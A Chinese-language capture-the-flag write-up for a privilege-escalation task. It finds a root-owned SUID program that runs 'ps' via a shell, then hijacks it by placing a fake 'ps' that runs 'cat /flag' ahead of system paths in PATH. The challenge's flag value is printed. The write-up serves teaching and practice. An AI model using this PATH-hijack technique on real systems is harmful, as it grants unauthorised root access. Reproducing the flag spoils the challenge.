# 内网渗透与高级社工-权限提升维持-G2 WriteUp

此题的知识点为SUID(Set User ID)，关于此权限可参看[https://www.cnblogs.com/sparkdev/p/9651622.html](https://www.cnblogs.com/sparkdev/p/9651622.html)

简单来说，若一个程序拥有SUID权限(s)，对于非root用户有执行权限(x)时，执行该程序时会以该程序所有者的身份来执行，而不是以当前用户的身份来执行。若该程序的onwer是root用户，则执行该程序的用户将拥有root权限。

我们首先查找所有拥有SUID权限的程序：

```bash
# 忽略错误输出，寻找权限4000(SUID)
find / -perm -4000 2>/dev/null
```

得到输出

```bash
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/su
/usr/bin/umount
/usr/bin/sudo
/usr/lib/openssh/ssh-keysign
/usr/local/bin/svcstat
```

最后有一个可疑的程序`/usr/local/bin/svcstat`，我们查看其文件信息：

```bash
ls -l /usr/local/bin/svcstat
```

该用户所有者为root，所有组为root，对于非所有者用户有执行权限，且拥有SUID权限。

```
-rwsr-xr-x 1 root root 16064 Aug 15 10:02 /usr/local/bin/svcstat
```

尝试执行该程序，获得输出

```
UID          PID    PPID  C STIME TTY          TIME CMD
root           1       0  0 13:43 ?        00:00:00 ttyd -p 80 -W runuser -u player -- bash -l
root           9       1  0 13:43 ?        00:00:00 sshd: /usr/sbin/sshd [listener] 0 of 10-100 startups
root          10       1  0 13:43 pts/0    00:00:00 runuser -u player -- bash -l
player        11      10  0 13:43 pts/0    00:00:00 bash -l
root          24      11  0 13:51 pts/0    00:00:00 /usr/local/bin/svcstat
root          25      24  0 13:51 pts/0    00:00:00 sh -c ps -ef
root          26      25  0 13:51 pts/0    00:00:00 ps -ef
```

这是典型的ps程序输出！同时我们在根目录使用ls -l命令时可看到无读取权限的flag文件

根据提示，我们可以更改PATH环境变量的优先级并劫持ps命令，使用root权限执行cat命令读取flag文件。

```bash
# 创建假ps命令执行cat
echo "cat /flag" > ~/ps
# 修改权限为可执行
chmod +x ~/ps
# 修改PATH环境变量，让home目录优先级高于/usr/bin，这样会优先执行/home/player/ps而不是/usr/bin/ps
export PATH=~:$PATH
# 执行svcstat程序，劫持ps命令
/usr/local/bin/svcstat
```

于是我们就可以读取到flag文件的内容。

```
vmc{jULGzyG41ywyxBgaagR3tmsyfDh1iRfl}
```
